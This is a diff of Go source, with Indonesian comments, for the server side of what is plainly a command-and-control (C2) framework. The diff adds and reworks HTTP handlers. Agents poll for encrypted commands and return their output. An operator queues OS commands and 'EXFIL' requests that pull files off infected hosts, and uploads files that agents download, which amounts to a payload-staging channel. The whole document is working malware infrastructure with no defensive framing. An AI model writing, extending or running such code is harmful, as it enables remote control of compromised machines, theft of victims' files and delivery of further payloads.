@@ -1,7 +1,6 @@
 package handlers
 
 import (
-	"encoding/base64"
 	"fmt"
 	"io"
 	"log"
@@ -29,6 +28,7 @@ func init() {
 	}
 }
 
+// PingHandler: Agent memanggil endpoint ini utk ambil command
 func PingHandler(w http.ResponseWriter, r *http.Request) {
 	encryptedInfo := r.URL.Query().Get("info")
 	decryptedInfo, err := utils.DecryptAES(encryptedInfo, encryptionKey)
@@ -65,10 +65,11 @@ func PingHandler(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
+// ResultHandler: Menerima hasil command atau exfil dari agent
 func ResultHandler(w http.ResponseWriter, r *http.Request) {
 	id := r.URL.Query().Get("id")
-	cmdType := r.URL.Query().Get("type")      // Bisa "cmd" atau "exfil"
-	filename := r.URL.Query().Get("filename") // Nama file jika exfil
+	cmdType := r.URL.Query().Get("type")      // "cmd" atau "exfil"
+	filename := r.URL.Query().Get("filename") // Untuk exfil
 
 	if id == "" || cmdType == "" {
 		http.Error(w, "Invalid agent ID or command type", http.StatusBadRequest)
@@ -90,19 +91,18 @@ func ResultHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Jika hasilnya adalah command OS, cukup log hasilnya
+	// Hasil perintah OS
 	if cmdType == "cmd" {
 		log.Printf("[+] Command result from agent %s: %s\n", id, decryptedResult)
 		fmt.Fprint(w, "Command result received")
 		return
 	}
 
-	// Jika hasilnya adalah file exfiltration, simpan file
+	// Hasil exfil file
 	if cmdType == "exfil" && filename != "" {
-		cleanFilename := filepath.Base(filename) // Ambil hanya nama file
+		cleanFilename := filepath.Base(filename) // Hindari path traversal
 		filePath := filepath.Join(exfilDir, cleanFilename)
-		err = os.WriteFile(filePath, []byte(decryptedResult), 0644)
-		if err != nil {
+		if err := os.WriteFile(filePath, []byte(decryptedResult), 0644); err != nil {
 			log.Printf("[-] Failed to save file %s: %v\n", filePath, err)
 			http.Error(w, "Failed to save file", http.StatusInternalServerError)
 			return
@@ -116,6 +116,7 @@ func ResultHandler(w http.ResponseWriter, r *http.Request) {
 	http.Error(w, "Invalid request type", http.StatusBadRequest)
 }
 
+// CommandHandler: Menerima command dari operator lalu queue ke agent
 func CommandHandler(w http.ResponseWriter, r *http.Request) {
 	id := r.URL.Query().Get("id")
 	cmd := r.URL.Query().Get("cmd")
@@ -128,6 +129,7 @@ func CommandHandler(w http.ResponseWriter, r *http.Request) {
 	fmt.Fprint(w, "Command queued for agent")
 }
 
+// ExfilHandler: Minta agent mengirim file (exfil)
 func ExfilHandler(w http.ResponseWriter, r *http.Request) {
 	id := r.URL.Query().Get("id")
 	filename := r.URL.Query().Get("filename")
@@ -135,42 +137,66 @@ func ExfilHandler(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "Agent ID and filename required", http.StatusBadRequest)
 		return
 	}
-	task.AddTask(id, "exfil "+filename)
+	task.AddTask(id, "EXFIL|"+filename)
 	log.Printf("[*] Requesting file %s from agent %s", filename, id)
 	fmt.Fprint(w, "Exfiltration request sent")
 }
 
-func FileReceiveHandler(w http.ResponseWriter, r *http.Request) {
-	id := r.URL.Query().Get("id")
+// UploadHandler: Operator meng-upload file ke server
+func UploadHandler(w http.ResponseWriter, r *http.Request) {
 	filename := r.URL.Query().Get("filename")
-	if id == "" || filename == "" {
-		http.Error(w, "Agent ID and filename required", http.StatusBadRequest)
+	if filename == "" {
+		http.Error(w, "Filename required", http.StatusBadRequest)
 		return
 	}
 
-	fileBytes, err := io.ReadAll(r.Body)
+	file, _, err := r.FormFile("file")
 	if err != nil {
-		log.Printf("[-] Failed to read request body: %v", err)
-		http.Error(w, "Failed to read file data", http.StatusInternalServerError)
+		http.Error(w, "Failed to read form file", http.StatusBadRequest)
 		return
 	}
+	defer file.Close()
 
-	defer r.Body.Close()
-	decodedData, err := base64.StdEncoding.DecodeString(string(fileBytes))
+	os.MkdirAll("uploaded_files", 0755)
+	dstPath := filepath.Join("uploaded_files", filepath.Base(filename))
+
+	dst, err := os.Create(dstPath)
 	if err != nil {
-		log.Printf("[-] Failed to decode file data: %v", err)
-		http.Error(w, "Failed to decode file data", http.StatusBadRequest)
+		http.Error(w, "Failed to create file on server", http.StatusInternalServerError)
 		return
 	}
+	defer dst.Close()
 
-	cleanFilename := filepath.Base(filename) // Ambil hanya nama file
-	filePath := filepath.Join(exfilDir, cleanFilename)
-	if err := os.WriteFile(filePath, decodedData, 0644); err != nil {
-		log.Printf("[-] Failed to save exfiltrated file: %v", err)
+	_, err = io.Copy(dst, file)
+	if err != nil {
 		http.Error(w, "Failed to save file", http.StatusInternalServerError)
 		return
 	}
 
-	log.Printf("[+] File received from agent %s: %s", id, filePath)
-	fmt.Fprint(w, "File received successfully")
+	log.Printf("[+] File uploaded to: %s\n", dstPath)
+	fmt.Fprint(w, "File uploaded successfully")
+}
+
+// DownloadHandler: Agent mendownload file dari server
+func DownloadHandler(w http.ResponseWriter, r *http.Request) {
+	filename := r.URL.Query().Get("filename")
+	if filename == "" {
+		http.Error(w, "Filename required", http.StatusBadRequest)
+		return
+	}
+
+	filePath := filepath.Join("uploaded_files", filepath.Base(filename))
+	f, err := os.Open(filePath)
+	if err != nil {
+		http.Error(w, "File not found", http.StatusNotFound)
+		return
+	}
+	defer f.Close()
+
+	w.Header().Set("Content-Disposition", "attachment; filename="+filepath.Base(filename))
+	_, err = io.Copy(w, f)
+	if err != nil {
+		log.Printf("[-] Failed to send file %s: %v\n", filePath, err)
+	}
+	log.Printf("[+] Sending file to agent: %s\n", filePath)
 }
